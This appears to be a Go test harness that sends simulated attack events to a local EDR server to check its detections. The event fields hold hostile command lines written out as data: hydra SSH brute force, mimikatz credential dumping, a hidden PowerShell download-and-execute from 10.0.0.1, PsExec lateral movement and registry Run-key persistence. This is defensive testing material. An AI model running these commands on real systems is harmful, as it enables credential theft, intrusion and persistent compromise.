package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

// Event represents a security event
type Event struct {
	EventID      int                    `json:"EventID"`
	CommandLine  string                 `json:"CommandLine"`
	Image        string                 `json:"Image"`
	ProcessName  string                 `json:"ProcessName"`
	User         string                 `json:"User"`
	ComputerName string                 `json:"ComputerName"`
	EventType    string                 `json:"event_type"`
	Timestamp    string                 `json:"@timestamp"`
	EventData    map[string]interface{} `json:"event_data,omitempty"`
}

func main() {
	fmt.Println("🚨 EDR Attack Simulation")
	fmt.Println("=" + string(make([]byte, 50)))
	fmt.Println("Simulating various attack scenarios...")
	fmt.Println()

	// Attack scenarios
	scenarios := []struct {
		name   string
		events []Event
		delay  time.Duration
	}{
		{
			name: "Scenario 1: SSH Brute Force Attack",
			events: []Event{
				{
					EventID:      1,
					EventType:    "process_creation",
					CommandLine:  "hydra -l root -P passwords.txt -t 16 ssh://192.168.1.100",
					Image:        "/usr/bin/hydra",
					ProcessName:  "hydra",
					User:         "attacker",
					ComputerName: "kali-attack",
					Timestamp:    time.Now().Format(time.RFC3339),
				},
				{
					EventID:      4625,
					EventType:    "failed_login",
					User:         "root",
					ComputerName: "target-server",
					Timestamp:    time.Now().Add(1 * time.Second).Format(time.RFC3339),
					EventData: map[string]interface{}{
						"LogonType":     10,
						"FailureReason": "%%2313",
						"IpAddress":     "192.168.1.50",
					},
				},
			},
			delay: 2 * time.Second,
		},
		{
			name: "Scenario 2: Mimikatz Credential Dumping",
			events: []Event{
				{
					EventID:      1,
					EventType:    "process_creation",
					CommandLine:  "cmd.exe /c whoami",
					Image:        "C:\\Windows\\System32\\cmd.exe",
					ProcessName:  "cmd.exe",
					User:         "admin",
					ComputerName: "WORKSTATION-01",
					Timestamp:    time.Now().Format(time.RFC3339),
				},
				{
					EventID:      1,
					EventType:    "process_creation",
					CommandLine:  "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
					Image:        "C:\\Temp\\mimikatz.exe",
					ProcessName:  "mimikatz.exe",
					User:         "admin",
					ComputerName: "WORKSTATION-01",
					Timestamp:    time.Now().Add(2 * time.Second).Format(time.RFC3339),
				},
			},
			delay: 3 * time.Second,
		},
		{
			name: "Scenario 3: PowerShell Reverse Shell",
			events: []Event{
				{
					EventID:      1,
					EventType:    "process_creation",
					CommandLine:  `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/shell.ps1')"`,
					Image:        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
					ProcessName:  "powershell.exe",
					User:         "user1",
					ComputerName: "DESKTOP-WIN10",
					Timestamp:    time.Now().Format(time.RFC3339),
				},
				{
					EventID:      3,
					EventType:    "network_connection",
					ProcessName:  "powershell.exe",
					User:         "user1",
					ComputerName: "DESKTOP-WIN10",
					Timestamp:    time.Now().Add(1 * time.Second).Format(time.RFC3339),
					EventData: map[string]interface{}{
						"DestinationIp":   "10.0.0.1",
						"DestinationPort": 443,
						"Protocol":        "tcp",
					},
				},
			},
			delay: 2 * time.Second,
		},
		{
			name: "Scenario 4: Lateral Movement with PsExec",
			events: []Event{
				{
					EventID:      1,
					EventType:    "process_creation",
					CommandLine:  "net use \\\\192.168.1.20\\IPC$ /user:DOMAIN\\admin Password123",
					Image:        "C:\\Windows\\System32\\net.exe",
					ProcessName:  "net.exe",
					User:         "admin",
					ComputerName: "DC-01",
					Timestamp:    time.Now().Format(time.RFC3339),
				},
				{
					EventID:      1,
					EventType:    "process_creation",
					CommandLine:  "psexec.exe \\\\192.168.1.20 -accepteula -s cmd.exe",
					Image:        "C:\\Tools\\PsExec.exe",
					ProcessName:  "psexec.exe",
					User:         "admin",
					ComputerName: "DC-01",
					Timestamp:    time.Now().Add(2 * time.Second).Format(time.RFC3339),
				},
			},
			delay: 3 * time.Second,
		},
		{
			name: "Scenario 5: Persistence via Registry",
			events: []Event{
				{
					EventID:      1,
					EventType:    "process_creation",
					CommandLine:  `reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\Temp\malware.exe" /f`,
					Image:        "C:\\Windows\\System32\\reg.exe",
					ProcessName:  "reg.exe",
					User:         "admin",
					ComputerName: "WORKSTATION-02",
					Timestamp:    time.Now().Format(time.RFC3339),
				},
			},
			delay: 2 * time.Second,
		},
	}

	// Send events to EDR server
	for i, scenario := range scenarios {
		fmt.Printf("\n🎯 %s\n", scenario.name)
		fmt.Println("-" + string(make([]byte, len(scenario.name)+3)))

		for j, event := range scenario.events {
			fmt.Printf("  📤 Sending event %d/%d: %s\n", j+1, len(scenario.events), event.ProcessName)
			
			err := sendEvent(event)
			if err != nil {
				fmt.Printf("     ❌ Error: %v\n", err)
			} else {
				fmt.Printf("     ✅ Event sent successfully\n")
			}
			
			if j < len(scenario.events)-1 {
				time.Sleep(500 * time.Millisecond)
			}
		}

		if i < len(scenarios)-1 {
			fmt.Printf("\n⏳ Waiting %v before next scenario...\n", scenario.delay)
			time.Sleep(scenario.delay)
		}
	}

	fmt.Println("\n" + "=" + string(make([]byte, 50)))
	fmt.Println("✅ Attack simulation completed!")
	fmt.Println("\n📊 Check EDR dashboard for detection results:")
	fmt.Println("   - http://localhost:8080/")
	fmt.Println("   - http://localhost:8080/api/v1/alerts")
}

func sendEvent(event Event) error {
	url := "http://localhost:8080/api/v1/events"
	
	jsonData, err := json.Marshal(event)
	if err != nil {
		return fmt.Errorf("failed to marshal event: %w", err)
	}
	
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send event: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("server returned status: %s", resp.Status)
	}
	
	return nil
}